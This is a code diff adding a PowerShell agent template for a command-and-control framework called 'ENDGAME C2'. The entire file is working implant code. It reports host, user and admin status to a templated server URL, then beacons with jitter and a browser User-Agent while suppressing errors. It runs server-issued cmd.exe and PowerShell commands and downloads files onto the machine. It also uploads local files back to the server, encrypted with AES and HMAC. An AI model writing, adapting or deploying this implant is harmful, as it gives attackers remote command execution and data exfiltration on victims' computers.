@@ -1,0 +1,121 @@
+{{/* ENDGAME C2 — Pure PowerShell Agent (slim, no bypass layers)
+   Crypto: AES-256-CBC + HMAC-SHA256 — works on PS 5.1 / .NET Framework 4.x.
+   Server must use SealCBC/OpenCBC for agents with language=ps1.
+   Vars: {{.ServerURL}}  {{.SleepMs}}  {{.JitterPct}}
+*/}}
+$ErrorActionPreference='SilentlyContinue'
+
+# ── AES-256-CBC + HMAC-SHA256 (native .NET Framework 4.x, no Add-Type needed) ─
+# Wire format: HMAC(32) + IV(16) + ciphertext(n) — Encrypt-then-MAC
+
+function Invoke-Seal {
+    param([byte[]]$K,[byte[]]$P)
+    $aes=[Security.Cryptography.Aes]::Create()
+    $aes.KeySize=256;$aes.Mode='CBC';$aes.Padding='PKCS7';$aes.Key=$K
+    $aes.GenerateIV();$iv=$aes.IV
+    $ct=$aes.CreateEncryptor().TransformFinalBlock($P,0,$P.Length)
+    $aes.Dispose()
+    $payload=$iv+$ct
+    $h=[Security.Cryptography.HMACSHA256]::new($K)
+    $mac=$h.ComputeHash($payload);$h.Dispose()
+    $mac+$payload
+}
+
+function Invoke-Open {
+    param([byte[]]$K,[byte[]]$D)
+    $mac=$D[0..31];$payload=$D[32..($D.Length-1)]
+    $h=[Security.Cryptography.HMACSHA256]::new($K)
+    $expected=$h.ComputeHash($payload);$h.Dispose()
+    for($i=0;$i-lt32;$i++){if($mac[$i]-ne$expected[$i]){throw 'MAC fail'}}
+    $iv=$payload[0..15];$ct=$payload[16..($payload.Length-1)]
+    $aes=[Security.Cryptography.Aes]::Create()
+    $aes.KeySize=256;$aes.Mode='CBC';$aes.Padding='PKCS7';$aes.Key=$K;$aes.IV=$iv
+    $pt=$aes.CreateDecryptor().TransformFinalBlock($ct,0,$ct.Length)
+    $aes.Dispose();$pt
+}
+
+# ── Config ────────────────────────────────────────────────────────────────────
+
+$C2='{{.ServerURL}}'
+$Ms={{.SleepMs}}
+$Jp={{.JitterPct}}
+$Aid=''
+$Ak=[byte[]]@()
+$Wc=[Net.WebClient]::new()
+$Wc.Headers['User-Agent']='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+
+function Get-Sleep {
+    $b=New-Object byte[] 1
+    ([Security.Cryptography.RNGCryptoServiceProvider]::new()).GetBytes($b)
+    $j=[int]($Ms*($Jp/100.0)*(($b[0]/255.0)*2-1))
+    [Math]::Max(500,$Ms+$j)
+}
+
+# ── Register ──────────────────────────────────────────────────────────────────
+
+function Connect-C2 {
+    $pr=[Diagnostics.Process]::GetCurrentProcess()
+    $ia=([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')
+    $rb=[Text.Encoding]::UTF8.GetBytes(([ordered]@{hostname=$env:COMPUTERNAME;username="$env:USERDOMAIN\$env:USERNAME";os=(Get-WmiObject Win32_OperatingSystem -EA SilentlyContinue).Caption;pid=[int]$pr.Id;transport='http';sleep_sec=[int]($Ms/1000);jitter_pct=[int]$Jp;process_name=$pr.ProcessName+'.exe';is_admin=$ia;language='ps1'}|ConvertTo-Json -Compress))
+    $Wc.Headers['Content-Type']='application/json'
+    $rs=[Text.Encoding]::UTF8.GetString($Wc.UploadData("$C2/register",'POST',$rb))|ConvertFrom-Json
+    $script:Aid=$rs.agent_id;$script:Ak=[Convert]::FromBase64String($rs.aes_key)
+}
+
+# ── Send result ───────────────────────────────────────────────────────────────
+
+function Send-Out {
+    param([long]$Id,[string]$Out,[string]$Err='')
+    $pt=[Text.Encoding]::UTF8.GetBytes(([ordered]@{task_id=$Id;output=$Out;error=$Err}|ConvertTo-Json -Compress))
+    $Wc.Headers['Content-Type']='application/octet-stream'
+    $Wc.UploadData("$C2/result/$Aid",'POST',(Invoke-Seal -K $Ak -P $pt))|Out-Null
+}
+
+# ── Task dispatch ─────────────────────────────────────────────────────────────
+
+function Run-Task {
+    param($T)
+    switch($T.type.ToLower()){
+        'shell' {
+            $o=& cmd.exe /c $T.args 2>&1|Out-String
+            Send-Out -Id $T.id -Out $o
+        }
+        'powershell' {
+            $o=[scriptblock]::Create($T.args).Invoke()|Out-String
+            Send-Out -Id $T.id -Out $o
+        }
+        'download' {
+            try{
+                $raw=$Wc.DownloadData("$C2/dl/$($T.args)")
+                $pt=Invoke-Open -K $Ak -D $raw
+                $fp="$env:TEMP\$(($T.args -split '/')[-1])"
+                [IO.File]::WriteAllBytes($fp,$pt);Send-Out -Id $T.id -Out "ok $fp"
+            }catch{Send-Out -Id $T.id -Out '' -Err $_.Exception.Message}
+        }
+        'upload' {
+            try{
+                $Wc.Headers['Content-Type']='application/octet-stream'
+                $Wc.UploadData("$C2/upload/$Aid`?name=$([IO.Path]::GetFileName($T.args))",'POST',(Invoke-Seal -K $Ak -P ([IO.File]::ReadAllBytes($T.args))))|Out-Null
+                Send-Out -Id $T.id -Out "ok"
+            }catch{Send-Out -Id $T.id -Out '' -Err $_.Exception.Message}
+        }
+        'sleep' {$script:Ms=[int]$T.args*1000;Send-Out -Id $T.id -Out "sleep $($T.args)s"}
+        'kill'  {Send-Out -Id $T.id -Out 'bye';[Environment]::Exit(0)}
+    }
+}
+
+# ── Main ──────────────────────────────────────────────────────────────────────
+
+for($i=0;$i-lt5;$i++){try{Connect-C2;break}catch{Start-Sleep 5}}
+if(-not $Aid){exit}
+
+while($true){
+    try{
+        $r=$Wc.DownloadData("$C2/beacon/$Aid")
+        if($r.Length-gt0){
+            $br=[Text.Encoding]::UTF8.GetString((Invoke-Open -K $Ak -D $r))|ConvertFrom-Json
+            foreach($t in $br.tasks){Run-Task $t}
+        }
+    }catch{if($_.Exception.Message-match'404'){Connect-C2}}
+    Start-Sleep -Ms (Get-Sleep)
+}
